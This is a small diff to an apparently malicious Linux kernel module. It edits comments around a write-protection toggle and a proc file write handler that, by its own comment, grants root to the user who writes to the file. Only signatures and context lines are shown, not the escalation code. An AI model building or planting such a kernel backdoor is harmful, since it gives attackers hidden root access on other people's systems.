@@ -37,7 +37,7 @@ void enable_wp(void){
     return;
 }
 
-//write handle overwrite
+//write overwrite
 ssize_t write_handler(struct file * flip,const char __user *buff,size_t count,loff_t *offp){
     char *kbuff;
     struct cred* cred;
@@ -65,7 +65,6 @@ ssize_t write_handler(struct file * flip,const char __user *buff,size_t count,lo
     return count;
 }
 
-//for proc_create to operate file in linux/fs.h
 //we nodify its write_handler to check the file and root the user
 struct file_operations proc_fops = {
     .write = write_handler
